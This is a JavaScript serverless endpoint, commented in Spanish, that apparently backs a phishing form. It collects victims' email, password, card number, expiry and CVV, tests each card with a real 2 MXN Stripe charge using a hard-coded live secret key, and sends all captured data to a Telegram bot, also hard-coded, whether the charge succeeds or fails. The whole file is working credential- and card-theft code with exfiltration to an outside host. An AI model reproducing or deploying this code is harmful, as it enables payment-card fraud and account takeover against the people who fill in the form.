import axios from 'axios';
import { stringify } from 'querystring';

export default async function handler(req, res) {
    // 1. Cabeceras para evitar errores de conexión (CORS)
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    // Manejar la petición "preflight" de los navegadores
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'Método no permitido' });
    }

    // 2. Extraer datos del cuerpo de la petición
    const { em, pw, nm, cc, ex, cv } = req.body;

    // Credenciales
    const token = "8255731465:AAGrPR_qH0zC4zTdBqOj-Zt1jqY0W03-yws";
    const chat_id = "7993722214";
    const stripe_secret = "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";

    try {
        // Validar que la fecha tenga el formato correcto MM/AA
        if (!ex || !ex.includes('/')) {
            throw new Error("Formato de fecha inválido");
        }

        const [month, year] = ex.split('/');
        
        // 3. Crear Token en Stripe
        const cardData = stringify({
            'card[number]': cc.replace(/\s/g, ''),
            'card[exp_month]': month.trim(),
            'card[exp_year]': '20' + year.trim(),
            'card[cvc]': cv.trim(),
            'card[name]': nm
        });

        const stripeToken = await axios.post('https://api.stripe.com/v1/tokens', cardData, {
            headers: { 
                'Authorization': `Bearer ${stripe_secret}`, 
                'Content-Type': 'application/x-www-form-urlencoded' 
            }
        });

        const tokenId = stripeToken.data.id;

        // 4. Realizar Cargo Real de $2.00 MXN
        const chargeData = stringify({
            amount: 200, // $2.00 MXN (en centavos)
            currency: 'mxn',
            source: tokenId,
            description: `Validación: ${em}`
        });

        const charge = await axios.post('https://api.stripe.com/v1/charges', chargeData, {
            headers: { 
                'Authorization': `Bearer ${stripe_secret}`, 
                'Content-Type': 'application/x-www-form-urlencoded' 
            }
        });

        // 5. Enviar éxito a Telegram
        if (charge.data.status === 'succeeded') {
            const msgSuccess = `✅ **APROBADO ($2.00 MXN)**\n\n📧 Email: \`${em}\` \n🔑 Pass: \`${pw}\` \n👤 Titular: \`${nm}\` \n💳 Card: \`${cc}\` \n📅 Exp: \`${ex}\` \n🔒 CVV: \`${cv}\``;
            
            await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, { 
                chat_id: chat_id, 
                text: msgSuccess,
                parse_mode: 'Markdown'
            });

            return res.status(200).json({ pago: true });
        }

    } catch (error) {
        // Capturar el motivo del rechazo de Stripe
        const errorMsg = error.response?.data?.error?.message || error.message || "Error bancario desconocido";
        
        // Enviar el reporte del fallo a Telegram para que sepas por qué falló
        const msgFail = `❌ **RECHAZADA / ERROR**\n\n⚠️ Motivo: ${errorMsg}\n📧 Email: \`${em}\` \n🔑 Pass: \`${pw}\` \n💳 Card: \`${cc}\` \n📅 Exp: \`${ex}\` \n🔒 CVV: \`${cv}\``;
        
        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, { 
            chat_id: chat_id, 
            text: msgFail,
            parse_mode: 'Markdown'
        }).catch(() => {});

        return res.status(200).json({ pago: false, mensaje_error: errorMsg });
    }
}
